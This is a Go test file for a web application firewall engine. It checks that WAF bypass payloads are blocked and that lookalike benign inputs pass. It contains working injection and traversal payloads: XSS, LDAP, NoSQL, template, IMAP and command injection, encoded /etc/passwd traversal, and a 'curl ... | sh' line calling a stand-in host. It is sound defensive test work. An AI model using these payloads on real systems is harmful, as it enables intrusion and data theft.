package waf

import (
	"encoding/base64"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

// Payloads GoTestWAF got past Sentinel 0.15.0, and normal inputs that look
// a little like them. Each payload must be blocked; each normal input must
// pass.
func TestBypassesFound2026(t *testing.T) {
	rules, err := LoadRules("")
	if err != nil {
		t.Fatal(err)
	}
	e := NewEngine(rules, 5)
	check := func(q string) Decision {
		r := httptest.NewRequest("GET", "/search?q="+url.QueryEscape(q), nil)
		return e.Inspect(r, nil)
	}
	b64 := func(s string) string { return base64.RawStdEncoding.EncodeToString([]byte(s)) }
	attacks := []string{
		"confirm.call(null,1)",
		"javascript:alert(1)",
		"JaVaScRiPt :void(0)",
		"alert?.(document?.cookie)",
		"db.injection.insert({success:1});",
		"(&(uid=admin)(!(&(1=0)(userPassword=q))))",
		"*)(uid=*))(|(uid=*",
		"\nV100 CAPABILITY\nV101 FETCH 4791",
		"|getent hosts somehost.burpcollaborator.net.&",
		"ax--exec=`id`--remote=origin",
		"aaaa'+#{16*8787}+'bbb",
		`\\::1\c$\users\default\ntuser.dat`,
		"\xc0\xae\xc0\xae\xc0\xafetc\xc0\xafpasswd",
		"<?xml version=\"1.0\" encoding=\"UTF-7\"?><foo/>",
		b64("<script>alert(1)</script>"),
		b64("1' UNION SELECT password FROM users--"),
		b64("../../../../etc/passwd"),
	}
	for _, a := range attacks {
		if d := check(a); !d.Attack {
			t.Errorf("not blocked: %q (score %d, %v)", a, d.Score, d.Matches)
		}
	}
	normal := []string{
		"Please confirm (by Friday) that the order is right",
		"alert me when the price drops",
		"db.example.com is our database host",
		"(and then) we left",
		"Mail from: the office. Rcpt is in the drawer",
		"host a party at #{place}",
		"use --verbose for more output",
		"C:\\Users\\me\\Documents",
		"SGVsbG8gd29ybGQgdGhpcyBpcyBmaW5l", // base64 of plain text without code
		"eyJ1c2VyIjoiYW5uIiwiaWQiOjQyfQ",   // base64 JSON: {"user":"ann","id":42}
		"dGhpc19pc19hX3Rva2VuXzEyMzQ1Njc4OTA",
		"5f2c9e7a1b3d4c6e8f0a1b2c3d4e5f6a", // hex ID
		"JavaScript: Basics of JavaScript Language",
	}
	for _, n := range normal {
		if d := check(n); d.Attack {
			t.Errorf("false alarm: %q (score %d, %v)", n, d.Score, d.Matches)
		}
	}
}

// Real tracking cookies and ad parameters that tripped CMDI-001 and NULL-001
// (open-appsec dataset); shell commands must still be caught.
func TestRealTrafficNotCommands(t *testing.T) {
	rules, _ := LoadRules("")
	e := NewEngine(rules, 5)
	check := func(q string) Decision {
		r := httptest.NewRequest("GET", "/x?q="+url.QueryEscape(q), nil)
		return e.Inspect(r, nil)
	}
	for _, n := range []string{
		"true|ts:1719928199526|id:019073b58aca002fc6f",
		"typ=organic|||src=google|||mdm=(none)|||trm=(none)|||id=(none)",
		"u1=s product details pg;id=sku2680263",
		"src=4448269;type=bbycom;cat=bby-s0;ord=87704573",
	} {
		if d := check(n); d.Attack {
			t.Errorf("false alarm: %q %v", n, d.Matches)
		}
	}
	for _, a := range []string{"x|id", "x; cat /etc/passwd", "$(whoami)", "a`id`", "x|cat${IFS}/etc/passwd", "x;ls -la", "x && curl http://e.example/s | sh"} {
		if d := check(a); !d.Attack {
			t.Errorf("not blocked: %q", a)
		}
	}
	// A binary body (protobuf, gzip) has zero bytes; a text body with one is suspicious.
	bin := httptest.NewRequest("POST", "/collect", nil)
	bin.Header.Set("Content-Type", "application/octet-stream")
	if d := e.Inspect(bin, []byte("\x08\x96\x01\x00\xff\xfe\x00\x12")); d.Attack {
		t.Errorf("binary body blocked: %v", d.Matches)
	}
	txt := httptest.NewRequest("POST", "/upload", nil)
	txt.Header.Set("Content-Type", "text/plain")
	if d := e.Inspect(txt, []byte("file=../secret.txt\x00.png")); !d.Attack {
		t.Error("null byte in a text body must still block")
	}
}

// TestDisguisedTraversal: separators hidden as overlong UTF-8, control bytes
// or "0x5c" still reach a sensitive file; prose that mentions one does not.
func TestDisguisedTraversal(t *testing.T) {
	rules, _ := LoadRules("")
	e := NewEngine(rules, 5)
	check := func(raw string) Decision {
		return e.Inspect(httptest.NewRequest("GET", "/x?p="+raw, nil), nil)
	}
	for _, a := range []string{
		"%c0%fe%c0%fe%c1%9cetc%c1%9cissue",
		"..0x5c..0x5c..0x5cetc0x5cissue",
		"%f8%80%80%80%ae%f8%80%80%80%ae%01etc%01passwd",
		"..%01..%01windows%01system32%01drivers%01etc%01hosts",
		"0x2e0x2e%c0%af0x2e0x2e%c0%afetc%c0%afpasswd",
	} {
		if d := check(a); !d.Attack {
			t.Errorf("not blocked: %q", a)
		}
	}
	// Broken percent-escapes and %u forms: the body can't be decoded, so it
	// is checked raw.
	for _, a := range []string{
		"p=%c0%ae%c0%ae%bg%qf%c0%ae%c0%ae%bg%qfetc%bg%qfpasswd",
		"p=%c0%ae%c0%ae%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts",
		"p=??%u2215??%u2215etc%u2215passwd",
		"p=%pcetc%c1%pcissue",
	} {
		r := httptest.NewRequest("POST", "/x", strings.NewReader(a))
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if d := e.Inspect(r, []byte(a)); !d.Attack {
			t.Errorf("not blocked: %q", a)
		}
	}
	for _, n := range []string{
		url.QueryEscape("refunds, returns, etc. issues with your order"),
		url.QueryEscape("etc passwd reset help"),
		url.QueryEscape("Windows 11 system32 folder size"),
		url.QueryEscape("sketch-hosts-group"),
	} {
		if d := check(n); d.Attack {
			t.Errorf("false alarm: %q %v", n, d.Matches)
		}
	}
}
